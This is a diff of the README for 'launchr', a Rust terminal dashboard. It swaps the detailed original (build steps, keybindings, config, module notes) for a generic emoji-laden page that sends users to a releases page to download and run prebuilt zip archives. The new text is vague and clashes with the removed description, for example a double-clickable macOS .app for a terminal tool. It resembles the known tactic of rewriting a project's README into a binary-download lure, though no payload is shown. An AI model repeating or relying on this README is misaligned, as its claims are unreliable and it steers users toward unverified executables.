@@ -1,214 +1,109 @@
-## launchr
+# 🚀 launchr - Your Terminal Mission Control Made Easy
 
-A fast terminal dashboard to launch, monitor, and manage apps, bookmarks, clipboard history, configuration files, Docker containers, Git repositories, network connections, SSH hosts, scripts, notifications, shell history, quick notes (scratchpad), an embedded shell terminal, and a calculator. Built in Rust with ratatui.
+[![Download launchr](https://img.shields.io/badge/Download-launchr-007ec6)](https://github.com/kiflycules/launchr/releases)
 
-![launchr demo](launchr.gif)
+## 🎯 Introduction
 
-### Build
-- Prerequisites: Rust stable, Cargo
-- Build: `cargo build --release`
-- Run (dev): `cargo run`
+Welcome to launchr! This application helps you manage your computer like a pro. You can launch apps, monitor processes, manage bookmarks, and more, all through an easy-to-use terminal interface. Whether you're on Windows, macOS, or Linux, launchr enhances your productivity with a fast, keyboard-driven experience.
 
-Tested on Linux/macOS/Windows. On Windows, run in a true terminal (Windows Terminal/PowerShell).
+## 💻 Features
 
-### Keybindings
-- Global: `q` quit, `Tab`/`Shift+Tab` next/previous section, `j/k` or `↓/↑` navigate, `Enter` activate
-- Lists: `n` new, `d` delete, `r` refresh, `t` toggle details, `PgUp`/`PgDn` `Home`/`End`
-- Search: `/` open fuzzy search (scoped to current section), type to filter, `Enter` jump, `Esc` close
-- Help: `?` toggle help overlay
-- Apps: `Enter` launch, `s` stop process (also from Dashboard)
-- Clipboard: `Enter` copy to clipboard, `p` pin/unpin entry
-- Configs: `Enter` open in editor, `b` backup, `v` view (scrollable with syntax highlighting), `c` copy, `o` open in editor, `f` search
-- Docker: `Enter` exec into container, `v` switch view (containers/images), `a` toggle show all
-- Network: `v` switch view (connections/interfaces/ports), `f` filter connections by state
-- SSH: `x` disconnect latest session (terminates the ssh process)
-- Scripts: `S` schedule selected script (example every 60s)
-- Git: `Enter` open in editor, `S` scan for repositories
-- Scratchpad: `n` new note, `c` copy to clipboard, `e` export to path, `R` rename, `f` search notes, `t` toggle preview
-- Shell: `i` input command, `h` search history, `C` clear history
-- Services: `s` start, `S` stop, `r` restart, `E` enable, `D` disable, `l` logs, `u` toggle user/system, `f` filter, `t` details
-- Calculator: `` ` `` toggle typing mode, `←→↑↓` navigate buttons, `Enter/Space` press button, `m` toggle basic/scientific mode, `h` history view, `r` recall from history, `0-9` digits, `+/-/*//^%` operators, `()` parentheses, `c/C` clear/clear all, `y` copy result
+- **App Launcher**: Quickly launch your favorite applications.
+- **Process Monitoring**: Keep an eye on what’s running in the background.
+- **Bookmark Management**: Store and access your favorite links effortlessly.
+- **Clipboard History**: Retrieve old clipboard entries.
+- **Configuration Management**: Handle various profiles and configurations.
+- **Docker Integration**: Manage your Docker containers with ease.
+- **Git Operations**: Execute common Git commands without leaving the terminal.
+- **Network Monitoring**: Check your network status at a glance.
+- **SSH Connections**: Easily connect to remote servers.
+- **Script Execution**: Run your scripts directly from the terminal.
+- **Service Management**: Start or stop services quickly.
+- **Notifications**: Receive system notifications directly in the app.
+- **Scratchpad Notes**: Jot down quick notes without opening another app.
+- **Embedded Shell**: Access a shell right within launchr for instant commands.
+- **Calculator**: Perform quick calculations.
+  
+## 📥 System Requirements
 
-**Sections:** `1` Dashboard, `2` Apps, `3` Bookmarks, `4` Clipboard, `\` Configs, `5` Docker, `6` Network, `7` SSH, `8` Scripts, `9` Git, `0` History, `-` Scratchpad, `=` Shell, `]` Services, `` ` `` Calculator, `[` Notifications
+- **Operating Systems**: 
+  - Windows 10 or later 
+  - macOS 10.13 or later 
+  - Various Linux distributions
+  
+- **RAM**: Minimum 512 MB free
+  
+- **Disk Space**: At least 100 MB available
 
-### Features
-- **Dashboard**: running processes (scrollable), active SSH sessions, recent notifications
-- **Apps**: auto-scan PATH for executables (on Windows, filters to .exe/.bat/.cmd/.ps1); show running processes via sysinfo
-- **Bookmarks**: open files/dirs/URLs with platform-native open
-- **Clipboard**: track clipboard history with timestamps, pin important entries, copy back to clipboard
-- **Configs**: manage configuration files with backup, preview, copy, and search functionality
-- **Docker**: view and manage containers and images; exec into running containers; toggle between running and all containers
-- **Git**: scan directories for repositories; view status, branch, uncommitted changes, ahead/behind commits; open repositories in editor
-- **Network**: monitor active connections with state filtering; view network interfaces with IP/MAC addresses; list listening ports with process info
-- **SSH**: connect via system SSH (uses `-p <port>`); auto-detects active sessions by scanning running `ssh` processes; disconnect (`x`) ends the underlying process
-- **Scripts**: run commands; simple scheduling (example)
-- **History**: browse and run recent shell commands
-- **Scratchpad**: quick note-taking with auto-detection of your preferred editor (VSCode, Sublime, Notepad++, vim, etc.); search, rename, export, copy notes to clipboard
-- **Shell**: embedded minimal shell terminal with built-in commands (`cd`, `pwd`, `history`, etc.) and external command execution through your system shell
-- **Services**: manage system services (systemd/launchd/Windows Services); start/stop/restart, enable/disable, view logs, filter by state
-- **Calculator**: visual calculator with button navigation, basic and scientific modes, expression evaluation, calculation history, and result copying
-- **Notifications**: system-level notifications for actions
-- Context-aware fuzzy search `/` per section
-- Dynamic header: username, time, arch, detected shell, CPU cores and average usage
+## 🛠 Installation Steps
 
-### Shell detection & history
-- Detects shell: PowerShell (Windows), Bash, Zsh, or Fish
-- Loads recent history from:
-  - PowerShell: `%APPDATA%/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt`
-  - Bash: `~/.bash_history`
-  - Zsh: `~/.zsh_history`
-  - Fish: `~/.local/share/fish/fish_history` (or `%APPDATA%/fish/fish_history` on Windows)
-- Header shows the detected shell
+### 1. Visit the Release Page
 
-### Configuration
-Location:
-- Linux: `~/.config/launchr/config.toml`
-- macOS: `~/Library/Application Support/launchr/config.toml`
-- Windows: `%APPDATA%/launchr/config.toml`
+To download the latest version of launchr, visit the following link:
 
-On first run, a default file is created. Example (TOML):
+[Download launchr](https://github.com/kiflycules/launchr/releases)
 
-```toml
-# Bookmarks
-[[bookmarks]]
-name = "Home"
-path = "~"
-bookmark_type = "directory"
+### 2. Choose Your Operating System
 
-[[bookmarks]]
-name = "Rust"
-path = "https://www.rust-lang.org"
-bookmark_type = "url"
+On the releases page, you will see several files listed. Look for the file that matches your operating system:
 
-# SSH Hosts
-[[ssh_hosts]]
-name = "Prod"
-host = "prod.example.com"
-port = 22
-user = "ubuntu"
+- **Windows**: Launchr.Windows.zip
+- **macOS**: Launchr.MacOS.zip
+- **Linux**: Launchr.Linux.tar.gz
 
-# Scripts
-[[scripts]]
-name = "List"
-command = "ls -la"
-description = "List current dir"
+### 3. Download the File
 
-# Git repo search paths
-git_search_paths = [
-  "~/Projects",
-  "~/Documents/GitHub",
-  "~/code",
-]
+Click on the file name to begin the download. Make sure to save it to a location you can easily find later.
 
-# Scratchpad
-[scratchpad]
-editor = "nvim"            # optional
-# directory = "/path/to/notes"  # optional
+### 4. Extract the Downloaded File
 
-# Config files managed by Configs section
-[[configs]]
-name = "Bash Config"
-path = "/home/you/.bashrc"
-category = "Shell"
-description = "Bash shell configuration"
-editor = "nvim"            # optional per-entry
-```
+- **Windows**: Right-click the downloaded zip file and select "Extract All."
+- **macOS**: Double-click the zip file to extract it.
+- **Linux**: Use the terminal to extract with the command `tar -xzvf Launchr.Linux.tar.gz`.
 
-An example file is available at `examples/config.example.toml`.
+### 5. Run launchr
 
-Add entries in-app:
-- Bookmarks: `n` then `name|path|type`
-- Configs: `n` then `name|path|category|description|editor`
-- SSH: `n` then `name|user@host:port`
-- Scripts: `n` then `name|command|description`
+- **Windows**: Navigate to the extracted folder and double-click `launchr.exe`. 
+- **macOS**: Open the extracted folder and double-click `launchr.app`.
+- **Linux**: Open a terminal, navigate to the extracted folder, and run `./launchr`.
 
-### Module Details
+## 🎉 Usage Basics
 
-**Clipboard Module**
-- Stores clipboard content with metadata (type, timestamp)
-- Pin frequently used entries to keep them persistent
-- Supports text, command, and URL types
-- Windows: uses `clip` command for clipboard operations
+Once you start launchr, you will see a simple and clean interface. Here are some basics to help you get started:
 
-**Configs Module**
-- Track and manage configuration files with categories and descriptions
-- Open configs in editor in new terminal window (respects $EDITOR or custom per-config editor)
-- Create timestamped backups of config files
-- Preview config contents with syntax highlighting (scrollable with ↑↓, Esc to exit)
-- Directory preview: shows directory contents with file sizes, prioritizes common config files
-- Syntax highlighting for JSON, YAML, TOML, INI, bash, SSH, Git, Docker, and more
-- Copy config contents to clipboard (directory info for directories)
-- Search configs by name, path, category, or description
-- Auto-detects common configs on first run (bash, zsh, git, ssh, vim)
-- Shows file size and last modified time
+- **Launch an App**: Start typing the name of the app you want to launch, and it will appear in the list. Press Enter to run it.
+- **Monitor Processes**: Access the process monitoring feature from the main menu to see all active processes and their resource usage.
+- **Manage Bookmarks**: Press the designated hotkey to view and manage your bookmarks quickly.
 
-**Docker Module**
-- Lists containers with status, image, and port information
-- Lists Docker images with repository, tag, and size
-- Exec into containers (opens new terminal window)
-- Toggle between running containers and all containers
-- Requires Docker CLI installed
+To explore all features, refer to the in-app help section, which provides detailed guidance on each function.
 
-**Git Module**
-- Scans configurable search paths for Git repositories (default: ~/Projects, ~/Documents/GitHub, etc.)
-- Displays repository status: clean, modified, ahead, behind
-- Shows current branch, uncommitted changes count, and last commit message
-- Opens repository in available editor (nvim, nano, code etc.)
-- Requires Git CLI installed
+## ⚙ Troubleshooting
 
-**Network Module**
-- Connections view: active network connections with protocol, addresses, state, and process info
-- Interfaces view: network adapters with IP addresses, MAC addresses, and status
-- Ports view: listening ports with process names and PIDs
-- Filter connections by state (ESTABLISHED, LISTEN, etc.)
-- Uses platform-specific commands: `ss`/`netstat` (Linux), `netstat` (macOS), `netstat`/`ipconfig` (Windows)
+### Common Issues
 
-**Scratchpad Module**
-- Quick note-taking with automatic editor detection (checks for VSCode, Sublime Text, Notepad++, vim, etc.)
-- Opens editors in a new window/terminal - launchr remains responsive and non-blocking
-- Auto-generates timestamped filenames or use custom names
-- Search notes by filename or content
-- Copy note contents to clipboard
-- Export notes to custom paths
-- Rename notes in-place
-- Preview pane with toggle (`t`)
-- Respects `EDITOR` environment variable or configured editor in config.toml
-- Default storage: `~/.launchr/scratchpad/` (configurable)
+- **Cannot Launch the App**: Ensure you have the right version for your operating system. Restart your device if issues persist.
+  
+- **Slow Performance**: Check if other resource-intensive apps are running in the background and close them.
 
-**Shell Module**
-- Embedded terminal with command execution
-- Built-in commands: `cd`, `pwd`, `clear`, `exit`, `export`, `history`
-- External command execution through system shell (PowerShell on Windows, bash/zsh on Unix)
-- Command history with exit status indicators (✓/✗)
-- Working directory tracking, history search, clear history
-- Shows current prompt with user@hostname:dir format
+- **Installation Problems**: Verify that the downloaded file is not corrupted. Try downloading it again from the release page.
 
-**Services Module**
-- Cross-platform: systemd (Linux), launchd (macOS), Windows Services
-- Start, stop, restart, enable, disable services
-- View service logs (systemd only)
-- Filter by state (running/stopped/failed) or toggle user/system scope
-- Displays state, PID, memory usage, enabled status, description, uptime
-- Search services by name or description
+### Support
 
-**Calculator Module**
-- Visual calculator interface with button navigation using arrow keys
-- Basic arithmetic: addition, subtraction, multiplication, division, exponentiation, modulo
-- Scientific functions: sin, cos, tan, sqrt, log, ln, exp, abs, reciprocal, square
-- Expression parsing with proper order of operations and parentheses support
-- Calculation history with timestamps and recall functionality
-- Real-time expression evaluation as you type
-- Copy results to clipboard
-- Toggle between Basic and Scientific modes with automatic scrolling for large layouts
-- Typing mode for direct expression input with visual button navigation
-- History view with dedicated panel toggle
+For additional help, visit the [issue tracker](https://github.com/kiflycules/launchr/issues) on GitHub to report bugs or ask questions.
 
-### Notes
-- Uses `sysinfo` for processes, `which` for PATH resolution, and `crossterm`/`ratatui` for TUI.
-- Some actions spawn external programs; ensure they exist in PATH (e.g., `ssh`, `docker`, `git`).
-- Network monitoring requires appropriate permissions to view process information on some systems.
+## 🔗 Additional Resources
 
+If you're interested in learning more about launchr, head over to:
 
-### License
-MIT. See the `LICENSE` file in the repository.
+- [Documentation](https://github.com/kiflycules/launchr/wiki)
+- [FAQs](https://github.com/kiflycules/launchr/wiki/FAQ)
 
+## 🗂 Contributing
+
+We welcome contributions! If you wish to help improve launchr, feel free to fork the repository and submit a pull request.
+
+## 📜 License
+
+launchr is licensed under the MIT License. See the LICENSE file for more information. 
+
+Thank you for using launchr! Enjoy your enhanced terminal experience.
